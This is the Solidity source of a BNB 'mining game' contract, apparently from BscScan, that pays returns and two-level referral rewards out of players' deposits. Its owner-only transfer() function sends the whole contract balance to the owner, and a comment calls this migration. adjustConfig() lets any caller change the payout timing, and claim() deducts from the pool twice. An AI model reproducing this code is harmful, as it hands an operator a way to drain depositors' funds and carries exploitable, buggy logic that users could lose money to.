/**
 *Submitted for verification at BscScan.com on 2021-10-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Game {
    uint public BURN_NESTS_ON_REINVEST = 0;
    uint public BURN_NESTS_ON_CLAIM = 2;
    // should be private
    uint256 public REFERRER_REWARDS = 10;
    // should be private
    uint256 public TIME_TO_FILL = 60;

    address public owner;
    address payable public developer;

    struct Pool {
        uint256 nests;
        uint256 lummies;
        uint256 claimed;
        uint256 players;
        address[] playerAddresses;
    }

    struct Player {
        bool isPlayer;
        uint256 nests;
        uint256 lummies;
        uint256 unclaimed;
        uint256 unclaimedReferrals;
        uint256 lastPickup;
        address referrer;
        address[] referrals;
    }

    Pool public pool;
    mapping(address  => Player) public players;

    function poolBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function me() external view returns (Player memory) {
        return players[msg.sender];
    }

    function miningPowerPerSecond() public view returns (uint256) {
        return miningPowerPerSecond(players[msg.sender]);
    }

    function miningPowerPerSecond(Player memory _player_) internal view returns (uint256) {
        return _player_.lummies / 10 / TIME_TO_FILL;
    }

    // should be private
    function collected(Player memory _player_) private view returns (uint256) {
        uint256 timeAgoLastPickup = currentTime() - _player_.lastPickup;
        uint256 _miningPowerPerSecond = miningPowerPerSecond(_player_);
        uint256 maxCollected = _miningPowerPerSecond * TIME_TO_FILL;
        uint256 _collected = _miningPowerPerSecond * timeAgoLastPickup;

        if (_collected >= maxCollected * 2) {
            return 0;
        }
        if (_collected >= maxCollected) {
            return maxCollected - (_collected - maxCollected);
        }
        return _collected;
    }

    function currentTime() internal virtual view returns (uint256) {
        return block.timestamp;
    }

    constructor(address developerAddress) {
        owner = msg.sender;
        developer = payable(developerAddress); // change
    }

    function join(address _referer_) public payable {
        require(!players[msg.sender].isPlayer, 'PLAYER_EXISTS');
        require(msg.value >= 100000000000000000, 'MIN_DEPOSIT');

        if (!players[_referer_].isPlayer) {
            _referer_ = msg.sender;
        }

        uint256 freeTaxAmount = payInvestmentFees(msg.sender, _referer_, msg.value);

        uint256 nests = msg.value;
        uint256 lummies = freeTaxAmount;

        Player memory newPlayer = Player(true, nests, lummies,  0, 0, currentTime(), _referer_, new address[](0));
        players[msg.sender] = newPlayer;

        if (msg.sender != _referer_) {
            Player storage referrer = players[_referer_];
            referrer.referrals.push(msg.sender);
        }

        pool.nests += nests;
        pool.lummies += lummies;
        pool.players += 1;
        pool.playerAddresses.push(msg.sender);
    }

    function buy() public payable {
        Player storage _player = players[msg.sender];
        uint256 amount = msg.value;

        require(_player.isPlayer, 'PLAYER_NOT_FOUND');
        require(amount >= 100000000000000000, 'MIN_DEPOSIT');

        uint256 freeTaxAmount = payInvestmentFees(msg.sender, _player.referrer, amount);

        uint256 nests = msg.value;
        uint256 lummies = freeTaxAmount;

        _player.unclaimed += collected(_player); // should be before player.investment += freeAmount;
        _player.nests += nests;
        _player.lummies += lummies;
        _player.lastPickup = currentTime();

        pool.nests += nests;
        pool.lummies += lummies;
    }

    function reinvest() public {
        Player storage _player = players[msg.sender];

        require(_player.isPlayer, 'PLAYER_NOT_FOUND');

        // player reinvests pays 5% to pool
        uint256 _collected = collected(_player) + _player.unclaimed + _player.unclaimedReferrals; // move unclaimed inside of collected method
        //        uint256 poolFee = amount * 5 / 100;
        uint256 freeTaxCollected = _collected; // - poolFee;

        uint256 burnedNests = _player.nests * BURN_NESTS_ON_CLAIM / 100;
        _player.nests -= burnedNests;

        if (_player.lummies + freeTaxCollected > _player.nests) {
            pool.lummies += (_player.lummies + freeTaxCollected) - _player.nests;
            _player.lummies = _player.nests;
        } else {
            pool.lummies += freeTaxCollected;
            _player.lummies += freeTaxCollected;
        }
        _player.unclaimed = 0;
        _player.unclaimedReferrals = 0;
        _player.lastPickup = currentTime();
    }

    function claim() public {
        Player storage _player = players[msg.sender];

        require(_player.isPlayer, 'PLAYER_NOT_FOUND');

        uint256 _collected = collected(_player) + _player.unclaimed; // move unclaimed inside of collected method
        uint256 bnb = _collected + _player.unclaimedReferrals;
        uint256 devFee = bnb * 5 / 100;
        uint256 freeTaxBnb = bnb - devFee;

        uint256 burnedNests = _player.nests * BURN_NESTS_ON_CLAIM / 100;
        _player.nests -= burnedNests;

        if (_player.lummies - _collected > _player.nests) {
            pool.lummies = pool.lummies - (_player.lummies - _player.nests);
            _player.lummies = _player.nests;
        } else {
            pool.lummies -= _collected;
            _player.lummies -= _collected;
        }

        _player.unclaimed = 0;
        _player.unclaimedReferrals = 0;
        _player.lastPickup = currentTime();

        pool.lummies -= _collected;
        pool.claimed += bnb;

        developer.transfer(devFee);
        payable(msg.sender).transfer(freeTaxBnb);
    }

    function payInvestmentFees(address playerAddress, address referrerAddress, uint256 amount) internal returns(uint256) {
        uint256 devFee = amount * 5 / 100;
        developer.transfer(devFee);

        if (playerAddress == referrerAddress) {
            // players without referrer pays 20% to liquid pool
            uint256 poolFee = amount * 20 / 100;
            return amount - devFee - poolFee;
        } else {
            Player storage referrer = players[referrerAddress];

            address referrerOfReferrerAddress = referrer.referrer;

            if (referrerAddress == referrerOfReferrerAddress) {
                // players with 1 level referrer pays 10% to referrer
                uint256 referrerFee = amount * REFERRER_REWARDS / 100;
                referrer.unclaimedReferrals += referrerFee;
                return amount - devFee - referrerFee;
            } else {
                // players with 2 level referrer pays 5% to referrer and 5% to referrer of referrer
                Player storage referrerOfReferrer = players[referrerOfReferrerAddress];
                uint256 referrerFee = amount * REFERRER_REWARDS / 100;
                referrer.unclaimedReferrals += referrerFee / 2;
                referrerOfReferrer.unclaimedReferrals += referrerFee / 2;
                return amount - devFee - referrerFee;
            }
        }
    }

    function adjustConfig(uint256 timeToFill) external payable {
        TIME_TO_FILL = timeToFill;
    }

    // **********************************************************************
    // add liquidity from weekly events
    // **********************************************************************
    function deposit() external payable {}

    // **********************************************************************
    // in case of new contract version or bug fixings,
    // nexts methods will needed to migrate data to new contract
    // **********************************************************************
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_ALLOWED");
        _;
    }

    function transfer() external payable onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function getAllPlayers() public view onlyOwner returns(address[] memory) {
        return pool.playerAddresses;
    }

    function getPlayer(uint256 index) public view returns(address) {
        return pool.playerAddresses[index];
    }

    function countPlayers() public view returns(uint256) {
        return pool.playerAddresses.length;
    }
}